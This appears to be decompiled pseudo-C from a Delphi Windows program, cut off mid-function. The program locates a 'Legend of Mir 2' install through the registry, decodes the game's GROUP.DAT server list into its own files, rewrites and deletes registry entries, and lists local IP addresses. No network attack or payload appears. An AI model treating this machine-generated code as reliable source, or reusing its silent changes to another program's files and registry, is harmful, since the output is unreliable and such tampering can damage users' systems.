//----- (0040DB58) --------------------------------------------------------
int __usercall sub_40DB58@<eax>(int a1@<eax>, _BYTE *a2@<edx>)
{
  int v2; // edi
  _BYTE *v3; // ebx
  int v4; // eax
  int v5; // esi
  int v6; // ebx
  unsigned int v8[2]; // [esp-Ch] [ebp-28h] BYREF
  int *v9; // [esp-4h] [ebp-20h]
  char *v10; // [esp+Ch] [ebp-10h] BYREF
  char *v11; // [esp+10h] [ebp-Ch] BYREF
  _BYTE *v12; // [esp+14h] [ebp-8h]
  __int32 v13; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v11 = 0;
  v10 = 0;
  v12 = a2;
  v13 = a1;
  sub_40470C(a1);
  sub_40470C((int)v12);
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_40DC64;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  sub_404304((volatile __int32 *)&v11, v13);
  v2 = sub_404524((int)v12) - 1;
  v3 = sub_404804(v12, v11);
  sub_405748(&dword_42CA10, (int)dword_40BF98, (void *)1, 0);
  for ( ; (int)v3 > 0; v3 = sub_404804(v12, v11) )
  {
    Delphi_Copy_40477C((int)v11, 1, (int)(v3 - 1), &v10);
    v4 = sub_405594(dword_42CA10);
    v5 = v4 + 1;
    sub_405748(&dword_42CA10, (int)dword_40BF98, (void *)1, v4 + 2);
    sub_4042C0((volatile __int32 *)(dword_42CA10 + 4 * v5), (__int32)v10);
    sub_4047BC(&v11, 1, (int)&v3[v2]);
  }
  v6 = sub_405594(dword_42CA10) + 1;
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_40DC6B;
  sub_404290((int)&v10, 4);
  return v6;
}
// 40BF98: using guessed type int dword_40BF98[2];
// 42CA10: using guessed type int dword_42CA10;

//----- (0040DC74) --------------------------------------------------------
int __usercall sub_40DC74@<eax>(int a1@<esi>)
{
  char v1; // zf
  char *v2; // eax
  char *v3; // eax
  void *v4; // esi
  HANDLE v5; // ebx
  void *v6; // esi
  DWORD v7; // ebx
  DWORD v8; // ebx
  DWORD v9; // edi
  int v10; // esi
  char v11; // bl
  HANDLE v12; // ebx
  int v13; // edi
  int v14; // esi
  char *v15; // eax
  char *v16; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-94h] BYREF
  char *v19; // [esp-14h] [ebp-90h]
  int *v20; // [esp-10h] [ebp-8Ch]
  unsigned int v21[2]; // [esp-Ch] [ebp-88h] BYREF
  int *v22; // [esp-4h] [ebp-80h]
  char *v23; // [esp+Ch] [ebp-70h] BYREF
  char *v24; // [esp+10h] [ebp-6Ch] BYREF
  char *v25; // [esp+14h] [ebp-68h] BYREF
  char *v26; // [esp+18h] [ebp-64h] BYREF
  __int32 v27; // [esp+1Ch] [ebp-60h] BYREF
  char *v28; // [esp+20h] [ebp-5Ch] BYREF
  char *v29; // [esp+24h] [ebp-58h] BYREF
  char *v30; // [esp+28h] [ebp-54h] BYREF
  char *v31; // [esp+2Ch] [ebp-50h] BYREF
  char *v32; // [esp+30h] [ebp-4Ch] BYREF
  char *v33; // [esp+34h] [ebp-48h] BYREF
  char *v34; // [esp+38h] [ebp-44h] BYREF
  char *v35; // [esp+3Ch] [ebp-40h] BYREF
  int *v36; // [esp+40h] [ebp-3Ch] BYREF
  char *v37; // [esp+44h] [ebp-38h] BYREF
  __int32 v38; // [esp+48h] [ebp-34h] BYREF
  char *v39; // [esp+4Ch] [ebp-30h] BYREF
  __int32 v40; // [esp+50h] [ebp-2Ch] BYREF
  char *v41; // [esp+54h] [ebp-28h] BYREF
  char *v42; // [esp+58h] [ebp-24h] BYREF
  char *v43; // [esp+5Ch] [ebp-20h] BYREF
  char v44; // [esp+60h] [ebp-1Ch]
  char v45; // [esp+61h] [ebp-1Bh]
  __int16 v46; // [esp+62h] [ebp-1Ah]
  int v47; // [esp+64h] [ebp-18h]
  char v48; // [esp+69h] [ebp-13h]
  char v49; // [esp+6Ah] [ebp-12h]
  char v50; // [esp+6Bh] [ebp-11h]
  char *v51; // [esp+6Ch] [ebp-10h] BYREF
  char *v52; // [esp+70h] [ebp-Ch] BYREF
  LPVOID lpBuffer; // [esp+74h] [ebp-8h]
  char v54; // [esp+7Ah] [ebp-2h] BYREF
  char Buffer; // [esp+7Bh] [ebp-1h] BYREF
  int savedregs; // [esp+7Ch] [ebp+0h] BYREF

  v22 = &savedregs;
  v21[1] = (unsigned int)&loc_40E22A;
  v21[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v21);
  sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "Filepath", &v43);
  sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "filetime", &v42);
  sub_404304(&v40, (__int32)"zhjfile2.ini");
  sub_404304((volatile __int32 *)&v39, (__int32)"zhjGROUP2.dat");
  sub_404304(&v38, (__int32)"zhjfile2.txt");
  if ( sub_40C2F4(v43) || (unsigned __int8)sub_40D9C8((int)"Mir.exe", (volatile __int32 *)&v43) )
  {
    sub_40D35C((int)v43, &v37, a1);
    sub_404304((volatile __int32 *)&v43, (__int32)v37);
    sub_4042C0(&dword_42CA0C, (__int32)v43);
    sub_40452C(&v43, (__int32)"GROUP.DAT");
    if ( sub_40C2F4(v43) )
    {
      sub_40C3F0(v43, 3, (volatile __int32 *)&v36);
      Delphi_CompareCall_404668((int)v42, v36);
      if ( v1 && (sub_40D304(&v35), sub_40452C(&v35, v40), sub_40C2F4(v35)) )
      {
        sub_40D304(&v34);
        sub_40452C(&v34, v40);
        sub_40D2A4(v34, "Main", "name", &v52, 0);
        sub_40DB58((int)v52, dword_40E2F4);
      }
      else
      {
        sub_40C3F0(v43, 3, (volatile __int32 *)&v42);
        sub_40D304(&v33);
        sub_40452C(&v33, (__int32)v39);
        if ( sub_40C2F4(v33) )
        {
          sub_40D304(&v32);
          sub_40452C(&v32, (__int32)v39);
          v2 = sub_40471C(v32);
          DeleteFileA(v2);
        }
        sub_40D304(&v31);
        sub_40452C(&v31, (__int32)v39);
        v19 = sub_40471C(v31);
        v3 = sub_40471C(v43);
        CopyFileA(v3, v19, 0);
        sub_404304((volatile __int32 *)&v41, (__int32)v43);
        sub_40D304(&v30);
        sub_404570((volatile __int32 *)&v43, v30, v39);
        if ( sub_40C2F4(v43) )
        {
          v4 = (void *)sub_40C394(v43, 64);
          sub_40D304(&v29);
          sub_40452C(&v29, v38);
          v5 = sub_40C370(v29);
          while ( sub_40C304(1u, &Buffer, v4) == 1 )
          {
            if ( (Buffer & 1) == 1 )
              v54 = Buffer - 1;
            else
              v54 = Buffer + 1;
            sub_40C330(1u, &v54, v5);
          }
          sub_40C35C(v4);
          sub_40C35C(v5);
          v20 = &savedregs;
          v19 = (char *)&loc_40E1FB;
          ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
          __writefsdword(0, (unsigned int)&ExceptionList);
          sub_40D304(&v28);
          sub_40452C(&v28, v38);
          v6 = (void *)sub_40C394(v28, 0);
          v7 = sub_40C364(2u, 0, v6);
          sub_40C364(0, 0, v6);
          lpBuffer = sub_40C7B0(v7 + 1);
          v8 = sub_40C304(v7, lpBuffer, v6);
          sub_40C35C(v6);
          sub_40426C(&v52);
          v50 = 0;
          v49 = 0;
          v48 = 0;
          sub_40426C(&v51);
          v47 = 0;
          v46 = 0;
          v45 = 0;
          v44 = 0;
          if ( (int)(v8 - 1) >= 0 )
          {
            v9 = v8;
            v10 = 0;
            do
            {
              v11 = *((_BYTE *)lpBuffer + v10);
              if ( v11 == 91 )
              {
                if ( !v50 )
                {
                  sub_404570((volatile __int32 *)&v52, (char *)dword_40E300, v52);
                  v50 = 1;
                  v48 = 0;
                }
              }
              else if ( !v50 || v49 )
              {
                if ( v49 && v11 == 93 )
                {
                  v49 = 0;
                  v50 = 0;
                  if ( (int)sub_404804("[Server", v52) <= 0 )
                  {
                    if ( !v44 && (int)sub_404804("[Setup", v52) > 0 )
                    {
                      if ( v45 )
                      {
                        LOBYTE(v46) = 0;
                        sub_40426C(&v52);
                        v49 = 0;
                        v50 = 0;
                      }
                      else
                      {
                        LOBYTE(v46) = 1;
                        v45 = 1;
                      }
                    }
                  }
                  else
                  {
                    HIBYTE(v46) = 1;
                    v45 = 0;
                    v44 = 0;
                    ++v47;
                  }
                  if ( v46 )
                  {
                    sub_40C670(v47, &v27);
                    sub_40452C(&v52, v27);
                  }
                  sub_4045E4((volatile __int32 *)&v52, 4);
                  sub_40452C(&v51, (__int32)v52);
                  v48 = 1;
                  sub_40426C(&v52);
                  v46 = 0;
                }
                else if ( v48 )
                {
                  sub_40444C(&v26);
                  sub_40452C(&v51, (__int32)v26);
                }
              }
              else if ( v11 == 109 || v11 == 71 || v11 == 83 )
              {
                v49 = 1;
                if ( v11 == 109 )
                  v44 = 1;
              }
              else
              {
                v50 = 0;
                sub_40426C(&v52);
              }
              if ( v50 )
              {
                sub_40444C(&v25);
                sub_40452C(&v52, (__int32)v25);
              }
              ++v10;
              --v9;
            }
            while ( v9 );
          }
          sub_40D304(&v24);
          sub_40452C(&v24, v40);
          v12 = sub_40C370(v24);
          v13 = sub_404524((int)v51);
          if ( v13 > 0 )
          {
            v14 = 1;
            do
            {
              Buffer = v51[v14 - 1];
              sub_40C330(1u, &Buffer, v12);
              ++v14;
              --v13;
            }
            while ( v13 );
          }
          sub_40C35C(v12);
          sub_40D304(&v23);
          sub_40452C(&v23, v40);
          sub_40D2A4(v23, "Main", "name", &v52, 0);
          sub_40DB58((int)v52, dword_40E2F4);
          v15 = sub_40471C(v41);
          sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "Filepath", 1, (BYTE *)v15);
          v16 = sub_40471C(v42);
          sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "filetime", 1, (BYTE *)v16);
          __writefsdword(0, (unsigned int)ExceptionList);
          v20 = (int *)&loc_40E202;
          sub_402700((int)lpBuffer);
        }
      }
    }
  }
  __writefsdword(0, v21[0]);
  v22 = (int *)&loc_40E231;
  sub_404290((int)&v23, 21);
  return sub_404290((int)&v51, 2);
}
// 40DD6A: variable 'v1' is possibly undefined
// 40E2F4: using guessed type int dword_40E2F4[3];
// 40E300: using guessed type int dword_40E300[3];
// 42CA0C: using guessed type _DWORD dword_42CA0C;

//----- (0040E348) --------------------------------------------------------
_DWORD *__usercall sub_40E348@<eax>(int a1@<eax>, char **a2@<edx>)
{
  int v3; // ebx
  int v4; // edi
  unsigned int v6[2]; // [esp-Ch] [ebp-20h] BYREF
  int *v7; // [esp-4h] [ebp-18h]
  char *v8; // [esp+Ch] [ebp-8h] BYREF
  int v9; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v8 = 0;
  v9 = a1;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_40E3B9;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_40426C(a2);
  v3 = sub_404524(v9);
  if ( v3 > 0 )
  {
    v4 = 1;
    do
    {
      sub_40444C(&v8);
      sub_40452C(a2, (__int32)v8);
      ++v4;
      --v3;
    }
    while ( v3 );
  }
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_40E3C0;
  return sub_40426C(&v8);
}

//----- (0040E3C8) --------------------------------------------------------
_DWORD *__usercall sub_40E3C8@<eax>(char **a1@<eax>)
{
  return sub_40E348(dword_42C9E4, a1);
}
// 42C9E4: using guessed type int dword_42C9E4;

//----- (0040E3DC) --------------------------------------------------------
_DWORD *__usercall sub_40E3DC@<eax>(int a1@<eax>)
{
  unsigned int v2[2]; // [esp-Ch] [ebp-10h] BYREF
  int *v3; // [esp-4h] [ebp-8h]
  __int32 v4; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v4 = a1;
  sub_40470C(a1);
  v3 = &savedregs;
  v2[1] = (unsigned int)&loc_40E41C;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  sub_4042C0(&dword_42C9E4, v4);
  __writefsdword(0, v2[0]);
  v3 = (int *)&loc_40E423;
  return sub_40426C(&v4);
}
// 42C9E4: using guessed type int dword_42C9E4;

//----- (0040E428) --------------------------------------------------------
_DWORD *__usercall sub_40E428@<eax>(int a1@<eax>, char **a2@<edx>)
{
  return sub_40E348(dword_42C918[a1], a2);
}
// 42C918: using guessed type int dword_42C918[];

//----- (0040E440) --------------------------------------------------------
volatile __int32 *__usercall sub_40E440@<eax>(__int32 *a1@<eax>)
{
  int v1; // edi
  volatile __int32 *v3; // esi
  volatile __int32 *result; // eax

  v1 = 3;
  v3 = dword_42C91C;
  do
  {
    result = sub_4042C0(v3++, *a1++);
    --v1;
  }
  while ( v1 );
  return result;
}
// 42C91C: using guessed type int dword_42C91C[3];

//----- (0040E46C) --------------------------------------------------------
int __usercall sub_40E46C@<eax>(int a1@<eax>)
{
  int v1; // edi
  int *v3; // esi
  int result; // eax

  v1 = 3;
  v3 = dword_42C970;
  do
  {
    result = sub_404DDC((int)v3, a1, (int)dword_40BF4C);
    v3 += 6;
    a1 += 24;
    --v1;
  }
  while ( v1 );
  return result;
}
// 40BF4C: using guessed type int dword_40BF4C[5];
// 42C970: using guessed type int dword_42C970[18];

//----- (0040E49C) --------------------------------------------------------
int __userpurge sub_40E49C@<eax>(int a1@<eax>, __int32 a2@<edx>, __int32 a3@<ecx>, char a4)
{
  unsigned int v5[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v6; // [esp-4h] [ebp-10h]
  __int32 v7; // [esp+0h] [ebp-Ch] BYREF
  __int32 v8; // [esp+4h] [ebp-8h]
  __int32 v9; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v7 = a3;
  v8 = a2;
  v9 = a1;
  sub_40470C(a1);
  sub_40470C(v8);
  sub_40470C(v7);
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_40E51B;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  sub_4042C0(&dword_42C9D0, v9);
  sub_4042C0(&dword_42C9D4, v8);
  sub_4042C0(&dword_42C9D8, v7);
  byte_42C9DC = a4;
  __writefsdword(0, v5[0]);
  v6 = (int *)&loc_40E522;
  return sub_404290((int)&v7, 3);
}
// 42C9D0: using guessed type __int32 dword_42C9D0;
// 42C9D4: using guessed type __int32 dword_42C9D4;
// 42C9D8: using guessed type __int32 dword_42C9D8;
// 42C9DC: using guessed type char byte_42C9DC;

//----- (0040E528) --------------------------------------------------------
int sub_40E528()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40E620;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_42CA14 )
  {
    sub_405868(&dword_42CA10, (int)dword_40BF98);
    sub_40426C(&dword_42CA0C);
    sub_40426C(&dword_42CA08);
    sub_40426C(&dword_42CA04);
    sub_40426C(&dword_42CA00);
    sub_40426C(&dword_42C9FC);
    sub_40426C(&dword_42C9F8);
    sub_40426C(&dword_42C9F4);
    sub_40426C(&dword_42C9F0);
    sub_40426C(&dword_42C9EC);
    sub_40426C(&dword_42C9E4);
    sub_404CB0((int)&unk_42C9D0, (int)dword_40BF1C);
    sub_40426C(&dword_42C9B8);
    sub_404CE4(dword_42C970, (char *)dword_40BF4C, 3);
    sub_404CE4(dword_42C928, (char *)dword_40BF4C, 3);
    sub_404CE4(dword_42C91C, (char *)dword_40105C, 3);
  }
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 40105C: using guessed type int dword_40105C[2];
// 40BF1C: using guessed type int dword_40BF1C[4];
// 40BF4C: using guessed type int dword_40BF4C[5];
// 40BF98: using guessed type int dword_40BF98[2];
// 42C91C: using guessed type int dword_42C91C[3];
// 42C928: using guessed type int dword_42C928[18];
// 42C970: using guessed type int dword_42C970[18];
// 42C9B8: using guessed type _DWORD dword_42C9B8;
// 42C9E4: using guessed type int dword_42C9E4;
// 42C9EC: using guessed type _DWORD dword_42C9EC;
// 42C9F0: using guessed type _DWORD dword_42C9F0;
// 42C9F4: using guessed type _DWORD dword_42C9F4;
// 42C9F8: using guessed type _DWORD dword_42C9F8;
// 42C9FC: using guessed type _DWORD dword_42C9FC;
// 42CA00: using guessed type _DWORD dword_42CA00;
// 42CA04: using guessed type _DWORD dword_42CA04;
// 42CA08: using guessed type _DWORD dword_42CA08;
// 42CA0C: using guessed type _DWORD dword_42CA0C;
// 42CA10: using guessed type int dword_42CA10;
// 42CA14: using guessed type int dword_42CA14;

//----- (0040E62C) --------------------------------------------------------
void sub_40E62C()
{
  --dword_42CA14;
}
// 42CA14: using guessed type int dword_42CA14;

//----- (0040E634) --------------------------------------------------------
__int64 __usercall sub_40E634@<edx:eax>(HKEY a1@<eax>, const CHAR *a2@<edx>)
{
  __int64 phkResult; // [esp+0h] [ebp-8h] BYREF

  LODWORD(phkResult) = 0;
  RegCreateKeyExA(a1, a2, 0, 0, 0, 0xF003Fu, 0, (PHKEY)&phkResult, (LPDWORD)&phkResult + 1);
  return phkResult;
}

//----- (0040E660) --------------------------------------------------------
HKEY __usercall sub_40E660@<eax>(HKEY a1@<eax>, const CHAR *a2@<edx>)
{
  HKEY v3; // [esp+0h] [ebp-4h] BYREF

  v3 = 0;
  RegOpenKeyExA_0(a1, a2, 0, 0xF003Fu, &v3);
  return v3;
}

//----- (0040E67C) --------------------------------------------------------
_DWORD *__userpurge sub_40E67C@<eax>(HKEY a1@<eax>, const CHAR *a2@<edx>, const CHAR *a3@<ecx>, int a4, BYTE *lpData)
{
  HKEY v5; // ebx
  int v6; // eax
  unsigned int v8[2]; // [esp-Ch] [ebp-1Ch] BYREF
  int *v9; // [esp-4h] [ebp-14h]
  char *v10; // [esp+8h] [ebp-8h] BYREF
  LPCSTR lpValueName; // [esp+Ch] [ebp-4h]
  int savedregs; // [esp+10h] [ebp+0h] BYREF

  v10 = 0;
  lpValueName = a3;
  v9 = &savedregs;
  v8[1] = (unsigned int)&loc_40E6E2;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  v5 = (HKEY)sub_40E634(a1, a2);
  sub_40445C(&v10, (char *)lpData);
  v6 = sub_404524((int)v10);
  RegSetValueExA(v5, lpValueName, 0, 1u, lpData, v6);
  RegCloseKey_0(v5);
  __writefsdword(0, v8[0]);
  v9 = (int *)&loc_40E6E9;
  return sub_40426C(&v10);
}

//----- (0040E6F4) --------------------------------------------------------
LSTATUS __usercall sub_40E6F4@<eax>(LPCSTR lpValueName@<ecx>, HKEY a2@<eax>, const CHAR *a3@<edx>)
{
  HKEY v4; // ebx

  v4 = sub_40E660(a2, a3);
  RegDeleteValueA(v4, lpValueName);
  return RegCloseKey_0(v4);
}

//----- (0040E710) --------------------------------------------------------
int __usercall sub_40E710@<eax>(HKEY a1@<eax>, char *a2@<edx>, const CHAR *a3@<ecx>)
{
  int v4; // ebx
  char *v5; // eax
  char *v6; // eax
  HKEY v7; // esi
  char *v8; // eax
  HKEY v9; // esi
  char *v11; // [esp-10h] [ebp-144h]
  unsigned int v12[2]; // [esp-Ch] [ebp-140h] BYREF
  int *v13; // [esp-4h] [ebp-138h]
  char *v14; // [esp+Ch] [ebp-128h] BYREF
  char *v15; // [esp+10h] [ebp-124h] BYREF
  char *v16; // [esp+14h] [ebp-120h] BYREF
  char *v17; // [esp+18h] [ebp-11Ch] BYREF
  char v18[256]; // [esp+1Ch] [ebp-118h] BYREF
  char *v19; // [esp+11Ch] [ebp-18h] BYREF
  char *v20; // [esp+120h] [ebp-14h] BYREF
  char *v21; // [esp+124h] [ebp-10h] BYREF
  char *v22; // [esp+128h] [ebp-Ch] BYREF
  LPCSTR lpSubKey; // [esp+12Ch] [ebp-8h]
  char *v24; // [esp+130h] [ebp-4h]
  int savedregs; // [esp+134h] [ebp+0h] BYREF

  v16 = 0;
  v15 = 0;
  v14 = 0;
  v21 = 0;
  v20 = 0;
  v19 = 0;
  v17 = 0;
  v22 = 0;
  lpSubKey = a3;
  v24 = a2;
  v13 = &savedregs;
  v12[1] = (unsigned int)&loc_40E8B4;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  v4 = 1;
  sub_40426C(&v22);
  do
  {
    sub_40C670(v4, (volatile __int32 *)&v21);
    v11 = sub_40471C(v21);
    sub_403048(v18, v24);
    sub_4044C8(&v19, v18);
    sub_40445C(&v17, (char *)lpSubKey);
    sub_4045E4((volatile __int32 *)&v20, 3);
    v5 = sub_40471C(v20);
    if ( !(unsigned __int8)sub_40E97C(a1, v5, v11) )
      break;
    sub_40C670(v4, (volatile __int32 *)&v22);
    sub_403048(v18, v24);
    sub_4044C8(&v15, v18);
    sub_40445C(&v14, (char *)lpSubKey);
    sub_4045E4((volatile __int32 *)&v16, 3);
    v6 = sub_40471C(v16);
    v7 = sub_40E660(a1, v6);
    v8 = sub_40471C(v22);
    RegDeleteKeyA(v7, v8);
    RegCloseKey_0(v7);
    ++v4;
  }
  while ( v4 <= 99 );
  v9 = sub_40E660(a1, v24);
  RegDeleteKeyA(v9, lpSubKey);
  RegCloseKey_0(v9);
  __writefsdword(0, v12[0]);
  v13 = (int *)&loc_40E8BB;
  sub_404290((int)&v14, 4);
  return sub_404290((int)&v19, 4);
}

//----- (0040E8D0) --------------------------------------------------------
LSTATUS __userpurge sub_40E8D0@<eax>(HKEY a1@<eax>, const CHAR *a2@<edx>, const CHAR *a3@<ecx>, char **a4)
{
  HKEY v4; // ebx
  BYTE Data[256]; // [esp+8h] [ebp-10Ch] BYREF
  DWORD cbData; // [esp+108h] [ebp-Ch] BYREF
  DWORD Type; // [esp+10Ch] [ebp-8h] BYREF
  LPCSTR lpValueName; // [esp+110h] [ebp-4h]

  lpValueName = a3;
  Type = 1;
  v4 = sub_40E660(a1, a2);
  cbData = 256;
  if ( RegQueryValueExA_0(v4, lpValueName, 0, &Type, Data, &cbData) )
    sub_40426C(a4);
  else
    sub_4044D4(a4, (char *)Data, 256);
  return RegCloseKey_0(v4);
}

//----- (0040E944) --------------------------------------------------------
int __usercall sub_40E944@<eax>(LPCSTR lpValueName@<ecx>, HKEY a2@<eax>, const CHAR *a3@<edx>, int a4@<ebx>)
{
  HKEY v5; // edi
  DWORD Type[4]; // [esp+0h] [ebp-10h] BYREF

  Type[0] = 1;
  v5 = sub_40E660(a2, a3);
  LOBYTE(a4) = RegQueryValueExA_0(v5, lpValueName, 0, Type, 0, 0) == 0;
  RegCloseKey_0(v5);
  return a4;
}
// 40E944: using guessed type DWORD Type[4];

//----- (0040E97C) --------------------------------------------------------
char *__usercall sub_40E97C@<eax>(HKEY a1@<eax>, char *a2@<edx>, char *a3@<ecx>)
{
  char *v4; // ebx
  char *v6; // eax
  HKEY v7; // eax
  unsigned int v9[2]; // [esp-Ch] [ebp-124h] BYREF
  int *v10; // [esp-4h] [ebp-11Ch]
  char *v11; // [esp+Ch] [ebp-10Ch] BYREF
  char v12[256]; // [esp+10h] [ebp-108h] BYREF
  char *v13; // [esp+110h] [ebp-8h] BYREF
  char *v14; // [esp+114h] [ebp-4h] BYREF
  int savedregs; // [esp+118h] [ebp+0h] BYREF

  v13 = 0;
  v11 = 0;
  v14 = 0;
  v4 = a2;
  v10 = &savedregs;
  v9[1] = (unsigned int)&loc_40EA43;
  v9[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v9);
  if ( a2 )
  {
    sub_403048(v12, a2);
    sub_4044C8(&v13, v12);
    sub_40445C(&v11, a3);
    sub_4045E4((volatile __int32 *)&v14, 3);
  }
  else
  {
    sub_40445C(&v14, a3);
  }
  v6 = sub_40471C(v14);
  v7 = sub_40E660(a1, v6);
  LOBYTE(v4) = v7 != 0;
  if ( v7 )
    RegCloseKey_0(v7);
  __writefsdword(0, v9[0]);
  v10 = (int *)&loc_40EA4A;
  sub_40426C(&v11);
  sub_404290((int)&v13, 2);
  return v4;
}

//----- (0040EA60) --------------------------------------------------------
DWORD __usercall sub_40EA60@<eax>(HKEY a1@<eax>, const CHAR *a2@<edx>, volatile __int32 *a3@<ecx>)
{
  DWORD v4; // esi
  HKEY v5; // edi
  int v6; // eax
  char v7; // zf
  int v8; // eax
  unsigned int v10[2]; // [esp-Ch] [ebp-90h] BYREF
  int *v11; // [esp-4h] [ebp-88h]
  char *v12; // [esp+Ch] [ebp-78h] BYREF
  char *v13; // [esp+10h] [ebp-74h] BYREF
  CHAR Name[101]; // [esp+17h] [ebp-6Dh] BYREF
  DWORD cchName[2]; // [esp+7Ch] [ebp-8h] BYREF
  int savedregs; // [esp+84h] [ebp+0h] BYREF

  v12 = 0;
  v13 = 0;
  cchName[1] = (DWORD)a2;
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_40EB46;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  v4 = 0;
  cchName[0] = 100;
  v5 = sub_40E660(a1, a2);
  if ( v5 )
  {
    while ( !RegEnumKeyExA(v5, v4, Name, cchName, 0, 0, 0, 0) )
    {
      cchName[0] = 100;
      sub_4044D4(&v13, Name, 101);
      sub_4045E4(a3, 3);
      ++v4;
    }
    RegCloseKey_0(v5);
  }
  v6 = sub_404524(*a3);
  Delphi_Copy_40477C(*a3, v6, 1, &v12);
  Delphi_CompareCall_404668((int)v12, &dword_40EB60);
  if ( v7 )
  {
    v8 = sub_404524(*a3);
    sub_4047BC((char **)a3, v8, 1);
  }
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_40EB4D;
  sub_404290((int)&v12, 2);
  return v4;
}
// 40EB12: variable 'v7' is possibly undefined
// 40EB60: using guessed type int dword_40EB60;

//----- (0040EB64) --------------------------------------------------------
int sub_40EB64()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40EB89;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_42CA18;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 42CA18: using guessed type int dword_42CA18;

//----- (0040EB94) --------------------------------------------------------
void sub_40EB94()
{
  --dword_42CA18;
}
// 42CA18: using guessed type int dword_42CA18;

//----- (0040EBF4) --------------------------------------------------------
int sub_40EBF4()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40EC19;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_42CA1C;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 42CA1C: using guessed type int dword_42CA1C;

//----- (0040EC24) --------------------------------------------------------
void sub_40EC24()
{
  --dword_42CA1C;
}
// 42CA1C: using guessed type int dword_42CA1C;

//----- (0040EC2C) --------------------------------------------------------
struct hostent *__usercall sub_40EC2C@<eax>(char **a1@<eax>)
{
  struct hostent *result; // eax
  char **h_addr_list; // esi
  int i; // ebx
  char *v5; // eax
  struct in_addr *v6; // edi
  char name[64]; // [esp+0h] [ebp-1E0h] BYREF
  struct WSAData WSAData; // [esp+40h] [ebp-1A0h] BYREF

  WSAStartup(0x101u, &WSAData);
  sub_40426C(a1);
  gethostname(name, 64);
  result = gethostbyname(name);
  if ( result )
  {
    h_addr_list = result->h_addr_list;
    for ( i = 0; ; ++i )
    {
      v6 = (struct in_addr *)h_addr_list[i];
      if ( !v6 )
        break;
      v5 = inet_ntoa(*v6);
      sub_40C65C(v5, a1);
    }
    return (struct hostent *)WSACleanup();
  }
  return result;
}

//----- (0040EC94) --------------------------------------------------------
int __usercall sub_40EC94@<eax>(HKEY a1@<eax>, char *a2@<edx>)
{
  signed int v3; // eax
  signed int v4; // esi
  _BYTE *v5; // eax
  int v6; // ebx
  char *v7; // eax
  char *v8; // eax
  unsigned int v10[2]; // [esp-Ch] [ebp-130h] BYREF
  int *v11; // [esp-4h] [ebp-128h]
  char v12[256]; // [esp+Ch] [ebp-118h] BYREF
  char *v13; // [esp+10Ch] [ebp-18h] BYREF
  char *v14; // [esp+110h] [ebp-14h] BYREF
  char *v15; // [esp+114h] [ebp-10h] BYREF
  char *v16; // [esp+118h] [ebp-Ch] BYREF
  char *v17; // [esp+11Ch] [ebp-8h] BYREF
  char *v18; // [esp+120h] [ebp-4h]
  int savedregs; // [esp+124h] [ebp+0h] BYREF

  v15 = 0;
  v14 = 0;
  v13 = 0;
  v17 = 0;
  v16 = 0;
  v18 = a2;
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_40EDB0;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  v3 = sub_40EA60(a1, a2, (volatile __int32 *)&v17);
  if ( v3 > 0 )
  {
    v4 = v3;
    do
    {
      v5 = sub_404804(dword_40EDC8, v17);
      v6 = (int)v5;
      if ( v5 )
